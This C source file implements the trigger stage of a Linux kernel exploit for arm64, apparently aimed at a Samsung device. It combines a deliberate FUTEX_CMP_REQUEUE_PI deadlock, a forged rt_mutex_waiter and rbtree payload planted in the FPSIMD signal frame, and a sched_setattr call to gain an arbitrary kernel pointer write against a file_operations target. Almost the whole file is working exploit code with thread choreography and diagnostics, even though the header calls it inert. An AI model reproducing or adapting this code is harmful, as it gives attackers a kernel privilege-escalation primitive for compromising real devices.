/*
 * =============================================================================
 * FUTEX PI v14 POINTER-WRITE TRIGGER  -  INERT, NOT WIRED INTO ANY LIVE PATH
 * =============================================================================
 * See futex_pi_v14.h for the phase-by-phase description, the reason this is not
 * yet enabled, and the list of what is deliberately not ported.
 *
 * Two rules govern the shape of the critical path, and both come straight from
 * the reference:
 *   1. Everything that can allocate, call getenv/atoi, format a string or take
 *      a libc lock is resolved BEFORE any of the three threads exist. After the
 *      waiter's rt_sigreturn the consumer must be able to reach sched_setattr
 *      through nothing but a spin and one syscall.
 *   2. All cross-thread state is one 4 KiB-aligned, page-pinned struct, so no
 *      thread ever has to touch the allocator to publish a flag.
 * =============================================================================
 */

#include "common.h"
#include "futex_pi_v14.h"

#include <asm/sigcontext.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/syscall.h>

/* The payload must land entirely inside fpsimd_context.vregs[]; if vregs were
 * smaller, the copy would silently run into fpsr/fpcr. BTF on this device:
 * fpsimd_context sizeof 0x210, vregs 0x10..0x20F, so 0x200 fits exactly. */
_Static_assert(FUTEX_PI_V14_FPSIMD_VREGS_SIZE ==
                   FUTEX_PI_V14_SIGNAL_PAYLOAD_SIZE,
               "payload must not spill out of fpsimd vregs");
_Static_assert(sizeof(struct fpsimd_context) ==
                   FUTEX_PI_V14_FPSIMD_VREGS_OFF +
                       FUTEX_PI_V14_FPSIMD_VREGS_SIZE,
               "fpsimd_context layout differs from target.h");
_Static_assert(sizeof(struct _aarch64_ctx) == FUTEX_PI_V14_AARCH64_CTX_SIZE,
               "_aarch64_ctx size differs from target.h");
_Static_assert(offsetof(struct sigcontext, __reserved) == 0x120,
               "sigcontext.__reserved offset differs from target.h");

/* ---------------------------------------------------------------------------
 * The 0x200-byte forged payload, and the record walk that installs it.
 * ------------------------------------------------------------------------- */

enum sigusr1_reason {
  SIGUSR1_NOT_DELIVERED = 0,
  SIGUSR1_BAD_SIZE_OR_ALIGN = 1,
  SIGUSR1_RECORD_OUT_OF_BOUNDS = 2,
  SIGUSR1_FPSIMD_MISSING = 3,
  SIGUSR1_SUCCESS = 4,
  SIGUSR1_TGKILL_FAILED = 5,
};

static unsigned char g_payload[FUTEX_PI_V14_SIGNAL_PAYLOAD_SIZE];
static volatile int g_handler_result;  /* 0 not run, 1 success, -1 failed */
static volatile int g_handler_reason;

static void pi_v14_put64(size_t off, uint64_t value) {
  memcpy(g_payload + off, &value, sizeof(value));
}

/*
 * Build the forged rt_mutex_waiter + rt_mutex_base pair.
 *
 * The two objects share one rb_node at payload+0x18: it is simultaneously
 * rt_mutex_base.waiters.rb.rb_node (rt_mutex_base+0x08) and
 * rt_mutex_waiter.tree_entry (rt_mutex_waiter+0x00). A one-node waiters tree
 * whose root is its own only node and whose leftmost is that same node is
 * self-consistent, which is what the rbtree walk requires when it starts from
 * the lock.
 *
 * rb_parent_color carries the REPLACEMENT and rb_right carries the TARGET: a
 * rbtree rotate/erase reads and writes through both, so a waiter node whose
 * right pointer is an arbitrary kernel address gives the caller one store of an
 * arbitrary value at an arbitrary address.
 */
static void pi_v14_build_payload(const struct futex_pi_v14_config *cfg,
                                 uint64_t parent, uint64_t right) {
  memset(g_payload, 0, sizeof(g_payload));

  /* tree_entry: the forged rbtree node carrying the write. */
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TREE_PARENT, parent);
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TREE_RIGHT, right);
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TREE_LEFT, 0);

  /* pi_tree_entry: self-referential so the pi chain stays walkable. */
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_PI_TREE_PARENT, cfg->pi_waiters_self);
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_PI_TREE_RIGHT, 0);
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_PI_TREE_LEFT, 0);

  /* task / lock: keep the traversal inside kernel memory (the reclaim page). */
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TASK, cfg->signal_scratch);
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_LOCK, cfg->fake_lock);

  /* wake_state + prio as one 8-byte store: they straddle one aligned word. */
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_WAKE_STATE,
               FUTEX_PI_V14_SIGNAL_WAKE_STATE_PRIO);

  /* rt_mutex_base.owner: an unowned lock ends the chain. */
  pi_v14_put64(FUTEX_PI_V14_SIGNAL_RT_MUTEX_OWNER, 0);
}

/*
 * SIGUSR1 handler on the waiter.
 *
 * Deliberately allocates nothing, takes no lock and calls no logging function:
 * it may be entered at any point in the waiter's critical window. It reports its
 * verdict through two volatile ints that the waiter reads after
 * sigusr1_fire_and_wait() returns, and the phase is recorded in the page so
 * rmg_diag can be called from the waiter afterwards.
 *
 * The record is found by walking sigcontext.__reserved, exactly as the kernel
 * itself does in setup_rt_frame(): a list of struct _aarch64_ctx headers, each
 * {magic, size}, terminated by a {0, 0} sentinel. That is why there is no
 * compile-time record offset to get wrong.
 */
static void pi_v14_sigusr1_handler(int sig, siginfo_t *info, void *ucontext_v) {
  (void)sig;
  (void)info;
  ucontext_t *uc = (ucontext_t *)ucontext_v;
  unsigned char *base = uc->uc_mcontext.__reserved;
  size_t limit = sizeof(uc->uc_mcontext.__reserved);
  size_t offset = 0;
  struct fpsimd_context *fpsimd = NULL;

  while (offset + sizeof(struct _aarch64_ctx) <= limit) {
    struct _aarch64_ctx *head = (struct _aarch64_ctx *)(base + offset);
    uint32_t magic = head->magic;
    uint32_t size = head->size;

    if (magic == 0 && size == 0) {
      break; /* end of record list; the kernel uses the same sentinel */
    }
    if (size < sizeof(struct _aarch64_ctx) || (size & 0xf) != 0) {
      g_handler_reason = SIGUSR1_BAD_SIZE_OR_ALIGN;
      g_handler_result = -1;
      return;
    }
    if (offset + size > limit) {
      g_handler_reason = SIGUSR1_RECORD_OUT_OF_BOUNDS;
      g_handler_result = -1;
      return;
    }
    if (magic == FUTEX_PI_V14_FPSIMD_MAGIC &&
        size == sizeof(struct fpsimd_context)) {
      fpsimd = (struct fpsimd_context *)head;
    }
    offset += size;
  }
  if (fpsimd == NULL) {
    g_handler_reason = SIGUSR1_FPSIMD_MISSING;
    g_handler_result = -1;
    return;
  }

  volatile unsigned char *dst =
      (volatile unsigned char *)((unsigned char *)fpsimd +
                                 FUTEX_PI_V14_FPSIMD_VREGS_OFF);
  volatile const unsigned char *src =
      (volatile const unsigned char *)g_payload;
  for (size_t i = 0; i < sizeof(g_payload); i++) {
    dst[i] = src[i];
  }
  g_handler_reason = SIGUSR1_SUCCESS;
  g_handler_result = 1;
}

static int pi_v14_install_handler(void) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = pi_v14_sigusr1_handler;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  return sigaction(SIGUSR1, &sa, NULL) == 0;
}

/* Raise SIGUSR1 at OUR OWN tid and spin until the handler has reported. */
static int pi_v14_fire_and_wait(void) {
  g_handler_result = 0;
  g_handler_reason = SIGUSR1_NOT_DELIVERED;

  long tid = syscall(SYS_gettid);
  long ret = syscall(SYS_tgkill, getpid(), (pid_t)tid, SIGUSR1);
  if (ret != 0) {
    g_handler_reason = SIGUSR1_TGKILL_FAILED;
    return 0;
  }
  for (uint64_t spins = 0; spins < FUTEX_PI_V14_LONG_SPIN_MAX; spins++) {
    if (g_handler_result != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }
  return g_handler_result == 1;
}

/* ---------------------------------------------------------------------------
 * Shared page. One 4 KiB-aligned instance, so publishing a flag never
 * allocates and never takes a libc lock.
 * ------------------------------------------------------------------------- */

struct pi_v14_state {
  atomic_int waiter_tid;
  atomic_int route_done;
  uint32_t pi_chain;
  atomic_int waiter_ready;
  atomic_int owner_started;
  atomic_int waiter_waiting;
  uint32_t wait;
  uint32_t pi_target;
  atomic_int sched_done;
  atomic_int gate;
  atomic_int owner_acquired;
  atomic_int attempt_count;
  atomic_int success_count;
  atomic_int stop;
  atomic_int delay_us;
  atomic_int state;
  atomic_int secondary_0;
  atomic_int secondary_1;
};

static struct pi_v14_state g_state __attribute__((aligned(4096)));
static const struct futex_pi_v14_config *g_cfg;
static uint64_t g_delay_cycles;
static volatile int g_last_step = -1;
/* Published by the waiter/consumer threads, read by main after the readiness
 * barrier, so they go through the page rather than plain globals. Initialised
 * at the top of futex_pi_v14_trigger() (an atomic_int cannot be statically
 * initialised to a non-zero value in C). */
static atomic_int g_main_cpu;
static atomic_int g_waiter_cpu;
static atomic_int g_consumer_cpu;

static void pi_v14_diag(const char *fmt, ...) {
  char buf[400];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  rmg_diag("futex-v14: %s\n", buf);
}

static void pi_v14_set_step(int step) {
  g_last_step = step;
  pi_v14_diag("step=%s", futex_pi_v14_step_name(step));
}

const char *futex_pi_v14_step_name(int step) {
  switch (step) {
    case FUTEX_PI_V14_STEP_INIT:
      return "init";
    case FUTEX_PI_V14_STEP_PLACED:
      return "placed";
    case FUTEX_PI_V14_STEP_DEADLOCK:
      return "deadlock";
    case FUTEX_PI_V14_STEP_GATE:
      return "gate";
    case FUTEX_PI_V14_STEP_PAYLOAD:
      return "payload";
    case FUTEX_PI_V14_STEP_MUTATION:
      return "mutation";
    case FUTEX_PI_V14_STEP_DONE:
      return "done";
    default:
      return "none";
  }
}

int futex_pi_v14_last_step(void) {
  return g_last_step;
}

int futex_pi_v14_handler_result(void) {
  return g_handler_result;
}

/* ---------------------------------------------------------------------------
 * Placement. Uses the src/core_ctl.h policy (JOB 1) rather than re-implementing
 * selection: capacity-ranked candidates, Samsung core_ctl filter, pin-and-
 * verify. Three roles need three DISTINCT cores, which is the same contract
 * rmg_select_pair() honours for the choreography pair, so we ask the same
 * ordered list for three entries.
 * ------------------------------------------------------------------------- */

static int pi_v14_pin_verified(int cpu) {
  cpu_set_t want;
  CPU_ZERO(&want);
  CPU_SET(cpu, &want);
  if (sched_setaffinity(0, sizeof(want), &want) != 0) {
    return 0;
  }
  if (sched_getcpu() != cpu) {
    return 0;
  }
  struct core_ctl_cpu_state state;
  struct core_rank now;
  core_ctl_probe_cpu(cpu, &state, &now);
  if (state.known && (state.paused || state.not_preferred)) {
    return 0;
  }
  return 1;
}

/*
 * Pick three distinct, currently-verifiable cores. Stores the result in the
 * three atomics and returns 0 when fewer than three survive, in which case the
 * caller must abandon the attempt: the choreography is timing-critical and
 * running two roles on one core is exactly the CPU-theft-during-choreography
 * case that panics.
 *
 * main is the best candidate, waiter the next, consumer the next. The waiter is
 * the role that must not be migrated (it holds the PI lock and receives the
 * signal), so every role is pin-and-verified before it is handed out.
 */
static int pi_v14_place_roles(void) {
  struct core_selection sel;
  int n = core_ctl_rank_candidates(&sel);
  pi_v14_diag("placement candidates=%d core_ctl_readable=%d have_capacity=%d",
              n, sel.core_ctl_readable, sel.have_capacity);
  if (n < 3) {
    pi_v14_diag("placement FAILED: need 3 distinct candidates, have %d", n);
    return 0;
  }

  int chosen[3] = {-1, -1, -1};
  for (int i = 0; i < n && chosen[0] < 0; i++) {
    if (!pi_v14_pin_verified(sel.rank[i].cpu)) {
      continue;
    }
    for (int k = 0; k < n && chosen[1] < 0; k++) {
      if (sel.rank[k].cpu == sel.rank[i].cpu ||
          !pi_v14_pin_verified(sel.rank[k].cpu)) {
        continue;
      }
      for (int m = 0; m < n; m++) {
        if (m == i || m == k || !pi_v14_pin_verified(sel.rank[m].cpu)) {
          continue;
        }
        chosen[0] = sel.rank[i].cpu;
        chosen[1] = sel.rank[k].cpu;
        chosen[2] = sel.rank[m].cpu;
        break;
      }
    }
  }
  if (chosen[0] < 0 || chosen[1] < 0 || chosen[2] < 0) {
    pi_v14_diag("placement FAILED: fewer than 3 cores passed pin-and-verify");
    return 0;
  }

  for (int i = 0; i < 3; i++) {
    pi_v14_diag("placement role=%s cpu=%d",
                i == 0 ? "main" : (i == 1 ? "waiter" : "consumer"), chosen[i]);
  }
  atomic_store(&g_main_cpu, chosen[0]);
  atomic_store(&g_waiter_cpu, chosen[1]);
  atomic_store(&g_consumer_cpu, chosen[2]);
  return 1;
}

static int pi_v14_pin_to(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  return sched_setaffinity(0, sizeof(set), &set) == 0;
}

static uint64_t pi_v14_cntvct(void) {
  uint64_t val;
  __asm__ volatile("mrs %0, cntvct_el0" : "=r"(val));
  return val;
}

static void pi_v14_spin(uint64_t cycles) {
  if (cycles == 0) {
    return;
  }
  uint64_t start = pi_v14_cntvct();
  while (pi_v14_cntvct() - start < cycles) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static uint64_t pi_v14_now_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000u + (uint64_t)ts.tv_nsec / 1000000u;
}

static long pi_v14_futex(uint32_t *uaddr, int op, uint32_t val,
                         const struct timespec *timeout, uint32_t *uaddr2,
                         uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* sched_setattr with a policy CHANGE. sched_setattr() -> __sched_setscheduler()
 * -> rt_mutex_adjust_pi() (kernel/sched/core.c) is only reached when the
 * effective priority or the policy actually changes, so a nice-only call with
 * an unchanged value is not a trigger. SCHED_BATCH (3) is what the reference
 * issues. */
static long pi_v14_sched_setattr(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = FUTEX_PI_V14_SETAUNCH_POLICY;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

/* ---------------------------------------------------------------------------
 * Roles.
 * ------------------------------------------------------------------------- */

static void *pi_v14_waiter_fn(void *arg) {
  (void)arg;
  if (!pi_v14_pin_to(atomic_load(&g_waiter_cpu))) {
    pi_v14_diag("waiter: pin to cpu=%d FAILED errno=%d", atomic_load(&g_waiter_cpu), errno);
    atomic_store(&g_state.stop, 1);
    atomic_store(&g_state.route_done, 1);
    return NULL;
  }
  atomic_store(&g_waiter_cpu, sched_getcpu());
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&g_state.waiter_tid, tid);
  pi_v14_diag("waiter: pinned cpu=%d tid=%d", atomic_load(&g_waiter_cpu), tid);

  /* SIGUSR1 must be unblocked on this thread, and the handler installed
   * process-wide before the signal can arrive. */
  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGUSR1);
  if (pthread_sigmask(SIG_UNBLOCK, &unblock, NULL) != 0) {
    pi_v14_diag("waiter: SIGUSR1 unblock FAILED");
    atomic_store(&g_state.stop, 1);
    atomic_store(&g_state.route_done, 1);
    return NULL;
  }
  if (!pi_v14_install_handler()) {
    pi_v14_diag("waiter: sigaction(SIGUSR1) FAILED errno=%d", errno);
    atomic_store(&g_state.stop, 1);
    atomic_store(&g_state.route_done, 1);
    return NULL;
  }

  if (pi_v14_futex(&g_state.pi_chain, FUTEX_PI_V14_OP_LOCK_PI, 0, NULL, NULL,
                   0) != 0) {
    pi_v14_diag("waiter: FUTEX_LOCK_PI(pi_chain) FAILED errno=%d", errno);
    atomic_store(&g_state.stop, 1);
    atomic_store(&g_state.route_done, 1);
    return NULL;
  }
  atomic_store(&g_state.waiter_ready, 1);

  while (!atomic_load(&g_state.owner_started) && !atomic_load(&g_state.stop)) {
    usleep(FUTEX_PI_V14_POLL_USEC);
  }
  if (atomic_load(&g_state.stop)) {
    atomic_store(&g_state.route_done, 1);
    return NULL;
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += FUTEX_PI_V14_WAIT_SEC;
  atomic_store(&g_state.waiter_waiting, 1);

  errno = 0;
  long wait_ret = pi_v14_futex(&g_state.wait, FUTEX_PI_V14_OP_WAIT_REQUEUE_PI,
                              0, &timeout, &g_state.pi_target, 0);
  int wait_errno = errno;
  pi_v14_diag("waiter: returned from WAIT_REQUEUE_PI ret=%ld errno=%d",
              wait_ret, wait_errno);

  /* Reset the handshake and publish state = -1. The consumer's ONLY job for
   * state == -1 is to open the gate and nothing else. */
  atomic_store(&g_state.sched_done, 0);
  atomic_store(&g_state.gate, 0);
  atomic_store(&g_state.success_count, 0);
  atomic_store(&g_state.attempt_count, 0);
  atomic_store(&g_state.delay_us, 0);
  atomic_store(&g_state.stop, 0);
  atomic_store(&g_state.state, -1);

  uint64_t deadline = pi_v14_now_ms() + FUTEX_PI_V14_GATE_TIMEOUT_MS;
  while (atomic_load(&g_state.gate) != 1 && pi_v14_now_ms() < deadline &&
         !atomic_load(&g_state.stop)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (atomic_load(&g_state.gate) != 1) {
    pi_v14_diag("waiter: gate never opened; abandoning");
    atomic_store(&g_state.state, 0);
    atomic_store(&g_state.stop, 1);
    atomic_store(&g_state.route_done, 1);
    return NULL;
  }
  pi_v14_diag("waiter: gate observed");

  /* THE WRITE PRIMITIVE: the handler copies the forged PI/RB payload into the
   * FPSIMD record of this very signal frame. */
  pi_v14_build_payload(g_cfg, g_cfg->fake_fops, g_cfg->target_fops);
  int sig_ok = pi_v14_fire_and_wait();
  pi_v14_diag("waiter: SIGUSR1 payload install ok=%d reason=%d result=%d",
              sig_ok, g_handler_reason, g_handler_result);

  if (sig_ok) {
    /* Publish state = 1. From here the consumer will, and only the consumer
     * will, cross the mutation boundary. */
    atomic_store(&g_state.state, 1);
    for (uint64_t spins = 0;
         spins <= FUTEX_PI_V14_LONG_SPIN_MAX &&
         !atomic_load(&g_state.sched_done);
         spins++) {
      __asm__ volatile("yield" ::: "memory");
    }
    pi_v14_diag("waiter: sched_done=%d attempts=%d successes=%d",
                atomic_load(&g_state.sched_done),
                atomic_load(&g_state.attempt_count),
                atomic_load(&g_state.success_count));
    atomic_store(&g_state.state, 0);
  } else {
    atomic_store(&g_state.state, 0);
  }

  atomic_store(&g_state.stop, 1);
  atomic_store(&g_state.route_done, 1);

  /* Release pi_chain so the owner can complete; the reference does this after
   * route_done so the attempt's teardown cannot race the owner. */
  (void)pi_v14_futex(&g_state.pi_chain, FUTEX_PI_V14_OP_UNLOCK_PI, 0, NULL,
                     NULL, 0);
  while (!atomic_load(&g_state.owner_acquired)) {
    usleep(FUTEX_PI_V14_POLL_USEC);
  }
  return NULL;
}

static void *pi_v14_owner_fn(void *arg) {
  (void)arg;
  if (pi_v14_futex(&g_state.pi_target, FUTEX_PI_V14_OP_LOCK_PI, 0, NULL, NULL,
                   0) != 0) {
    pi_v14_diag("owner: FUTEX_LOCK_PI(pi_target) FAILED errno=%d", errno);
    atomic_store(&g_state.stop, 1);
    return NULL;
  }
  while (!atomic_load(&g_state.waiter_ready)) {
    usleep(FUTEX_PI_V14_POLL_USEC);
  }
  atomic_store(&g_state.owner_started, 1);

  /* Blocking on pi_chain, which the waiter holds: this is the cycle that makes
   * FUTEX_CMP_REQUEUE_PI report EDEADLK. */
  (void)pi_v14_futex(&g_state.pi_chain, FUTEX_PI_V14_OP_LOCK_PI, 0, NULL, NULL,
                     0);
  atomic_store(&g_state.owner_acquired, 1);

  /* Unlike the reference we do NOT sit in `for(;;) sleep(1)`. We hold pi_target
   * until the waiter releases pi_chain, then release and exit, so a failed
   * attempt does not leave three live threads behind for the next one. */
  while (!atomic_load(&g_state.stop)) {
    usleep(FUTEX_PI_V14_POLL_USEC);
  }
  (void)pi_v14_futex(&g_state.pi_target, FUTEX_PI_V14_OP_UNLOCK_PI, 0, NULL,
                     NULL, 0);
  return NULL;
}

static void *pi_v14_consumer_fn(void *arg) {
  (void)arg;
  if (!pi_v14_pin_to(atomic_load(&g_consumer_cpu))) {
    pi_v14_diag("consumer: pin to cpu=%d FAILED errno=%d",
                atomic_load(&g_consumer_cpu), errno);
    atomic_store(&g_state.stop, 1);
    atomic_store(&g_state.route_done, 1);
    return NULL;
  }
  atomic_store(&g_consumer_cpu, sched_getcpu());
  pi_v14_diag("consumer: pinned cpu=%d", atomic_load(&g_consumer_cpu));

  int previous_state = 0;
  while (!atomic_load(&g_state.stop)) {
    int state = atomic_load(&g_state.state);
    int tid = atomic_load(&g_state.waiter_tid);

    if (state == 0) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    if (state == -1) {
      /* Open the handshake gate. This is the only thing done for state == -1,
       * and it must stay that way: the waiter has just come back from
       * rt_sigreturn and everything after this point is on the critical path. */
      atomic_store(&g_state.gate, 1);
      while (!atomic_load(&g_state.stop) &&
             atomic_load(&g_state.state) == -1) {
        __asm__ volatile("yield" ::: "memory");
      }
      continue;
    }

    if (state == previous_state) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    previous_state = state;

    if (atomic_load(&g_state.stop) || atomic_load(&g_state.state) != state) {
      continue;
    }

    /* ---- MUTATION BOUNDARY, part 1: mark pending BEFORE the syscall. */
    if (g_cfg != NULL && g_cfg->mutation_state != NULL) {
      __atomic_store_n(g_cfg->mutation_state, g_cfg->pending_state,
                       __ATOMIC_RELEASE);
    }

    /* g_delay_cycles was resolved before this thread existed, so this spin has
     * no libc, getenv or allocation in it. */
    pi_v14_spin(g_delay_cycles);

    if (atomic_load(&g_state.stop) || atomic_load(&g_state.state) != state) {
      continue;
    }

    /* ---- MUTATION BOUNDARY: this is the call that lets the kernel publish
     * the forged pointer. Everything either side of it is bookkeeping. */
    atomic_fetch_add_explicit(&g_state.attempt_count, 1, memory_order_relaxed);
    errno = 0;
    long ret = pi_v14_sched_setattr(tid, FUTEX_PI_V14_SETAUNCH_NICE);
    int sched_errno = errno;
    if (g_cfg != NULL && g_cfg->mutation_state != NULL) {
      __atomic_store_n(g_cfg->mutation_state, g_cfg->mutated_state,
                       __ATOMIC_RELEASE);
    }
    if (ret == 0) {
      atomic_fetch_add_explicit(&g_state.success_count, 1,
                                memory_order_relaxed);
    }
    atomic_store(&g_state.sched_done, 1);
    atomic_store(&g_state.state, 0);
    pi_v14_diag("consumer: sched_setattr tid=%d ret=%ld errno=%d (the "
                "mutation boundary)",
                tid, ret, sched_errno);
  }
  return NULL;
}

/* ---------------------------------------------------------------------------
 * Entry point.
 * --------------------------------------------------------------------------- */

int futex_pi_v14_trigger(const struct futex_pi_v14_config *cfg) {
  if (cfg == NULL || cfg->target_fops == 0 || cfg->fake_fops == 0 ||
      cfg->fake_lock == 0 || cfg->fake_task == 0 ||
      cfg->pi_waiters_self == 0 || cfg->signal_scratch == 0) {
    pi_v14_diag("REJECTED: incomplete config");
    return 0;
  }
  g_cfg = cfg;
  g_last_step = -1;
  g_handler_result = 0;
  g_handler_reason = SIGUSR1_NOT_DELIVERED;
  pi_v14_set_step(FUTEX_PI_V14_STEP_INIT);
  pi_v14_diag("trigger: page_base=%llx target_fops=%llx fake_fops=%llx "
              "fake_lock=%llx fake_task=%llx pi_self=%llx scratch=%llx",
              (unsigned long long)cfg->page_base,
              (unsigned long long)cfg->target_fops,
              (unsigned long long)cfg->fake_fops,
              (unsigned long long)cfg->fake_lock,
              (unsigned long long)cfg->fake_task,
              (unsigned long long)cfg->pi_waiters_self,
              (unsigned long long)cfg->signal_scratch);

  g_state.wait = 0;
  g_state.pi_target = 0;
  g_state.pi_chain = 0;
  atomic_store(&g_state.waiter_tid, 0);
  atomic_store(&g_state.route_done, 0);
  atomic_store(&g_state.waiter_ready, 0);
  atomic_store(&g_state.owner_started, 0);
  atomic_store(&g_state.waiter_waiting, 0);
  atomic_store(&g_state.sched_done, 0);
  atomic_store(&g_state.gate, 0);
  atomic_store(&g_state.owner_acquired, 0);
  atomic_store(&g_state.attempt_count, 0);
  atomic_store(&g_state.success_count, 0);
  atomic_store(&g_state.stop, 0);
  atomic_store(&g_state.delay_us, 0);
  atomic_store(&g_state.state, 0);
  atomic_store(&g_state.secondary_0, 0);
  atomic_store(&g_state.secondary_1, 0);

  /* Resolve every environment-dependent value BEFORE a thread exists, so the
   * consumer's critical window stays empty. */
  g_delay_cycles = FUTEX_PI_V14_DELAY_CYCLES;
  const char *delay_env = getenv("FUTEX_PI_V14_DELAY_CYCLES");
  if (delay_env != NULL && *delay_env) {
    long v = strtol(delay_env, NULL, 0);
    if (v >= 0) {
      g_delay_cycles = (uint64_t)v;
    }
  }
  pi_v14_diag("trigger: delay_cycles=%llu",
              (unsigned long long)g_delay_cycles);

  atomic_store(&g_main_cpu, -1);
  atomic_store(&g_waiter_cpu, -1);
  atomic_store(&g_consumer_cpu, -1);
  if (!pi_v14_place_roles()) {
    return 0;
  }
  if (!pi_v14_pin_to(atomic_load(&g_main_cpu)) ||
      sched_getcpu() != atomic_load(&g_main_cpu)) {
    pi_v14_diag("main: pin to cpu=%d FAILED", atomic_load(&g_main_cpu));
    return 0;
  }
  atomic_store(&g_main_cpu, sched_getcpu());
  pi_v14_diag("main: pinned cpu=%d", atomic_load(&g_main_cpu));
  pi_v14_set_step(FUTEX_PI_V14_STEP_PLACED);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, pi_v14_waiter_fn, NULL) != 0) {
    pi_v14_diag("pthread_create(waiter) FAILED");
    return 0;
  }
  if (pthread_create(&owner, NULL, pi_v14_owner_fn, NULL) != 0) {
    pi_v14_diag("pthread_create(owner) FAILED");
    atomic_store(&g_state.stop, 1);
    return 0;
  }
  if (pthread_create(&consumer, NULL, pi_v14_consumer_fn, NULL) != 0) {
    pi_v14_diag("pthread_create(consumer) FAILED");
    atomic_store(&g_state.stop, 1);
    return 0;
  }

  uint64_t ready_deadline = pi_v14_now_ms() + FUTEX_PI_V14_READY_TIMEOUT_MS;
  while (!atomic_load(&g_state.waiter_waiting) ||
         !atomic_load(&g_state.owner_started)) {
    if (atomic_load(&g_state.stop) || pi_v14_now_ms() >= ready_deadline) {
      pi_v14_diag("thread readiness TIMEOUT (waiter_waiting=%d "
                  "owner_started=%d stop=%d)",
                  atomic_load(&g_state.waiter_waiting),
                  atomic_load(&g_state.owner_started),
                  atomic_load(&g_state.stop));
      atomic_store(&g_state.stop, 1);
      return 0;
    }
    usleep(FUTEX_PI_V14_POLL_USEC);
  }
  pi_v14_diag("threads ready: main=%d waiter=%d consumer=%d",
              atomic_load(&g_main_cpu), atomic_load(&g_waiter_cpu),
              atomic_load(&g_consumer_cpu));

  usleep(FUTEX_PI_V14_PAUSE_USEC);

  /* The requeue that is EXPECTED to fail with EDEADLK. */
  errno = 0;
  long requeue_ret = pi_v14_futex(&g_state.wait,
                                  FUTEX_PI_V14_OP_CMP_REQUEUE_PI, 1,
                                  (void *)1, &g_state.pi_target, 0);
  int requeue_errno = errno;
  pi_v14_diag("main: CMP_REQUEUE_PI ret=%ld errno=%d", requeue_ret,
              requeue_errno);
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    pi_v14_diag("main: CMP_REQUEUE_PI did not report EDEADLK; the requeue "
                "state is not the one the trigger needs");
    atomic_store(&g_state.stop, 1);
  }
  pi_v14_set_step(FUTEX_PI_V14_STEP_DEADLOCK);

  /* On abort, stop is already set and waiting for teardown would only add to
   * the wall time; on the success path route_done is what the waiter sets once
   * the consumer has run its sched_setattr. */
  while (!atomic_load(&g_state.route_done) && !atomic_load(&g_state.stop)) {
    usleep(FUTEX_PI_V14_POLL_USEC);
  }
  pi_v14_set_step(FUTEX_PI_V14_STEP_GATE);

  int attempts = atomic_load(&g_state.attempt_count);
  int successes = atomic_load(&g_state.success_count);
  pi_v14_diag("summary gate=%d payload=%d handler_reason=%d attempts=%d "
              "successes=%d cmp_ret=%ld cmp_errno=%d cpu=%d/%d/%d",
              atomic_load(&g_state.gate), atomic_load(&g_state.sched_done),
              g_handler_reason, attempts, successes, requeue_ret, requeue_errno,
              atomic_load(&g_main_cpu), atomic_load(&g_waiter_cpu),
              atomic_load(&g_consumer_cpu));

  if (attempts < 1) {
    pi_v14_diag("FAILED: sched_setattr was never issued, nothing "
                "kernel-global was attempted; safe to retry");
    atomic_store(&g_state.stop, 1);
    return 0;
  }

  pi_v14_set_step(FUTEX_PI_V14_STEP_MUTATION);
  pi_v14_set_step(FUTEX_PI_V14_STEP_DONE);
  pi_v14_diag("triggered: the mutation boundary was crossed. From here the "
              "attempt must NOT be killed or retried in this boot.");
  atomic_store(&g_state.stop, 1);
  return 1;
}
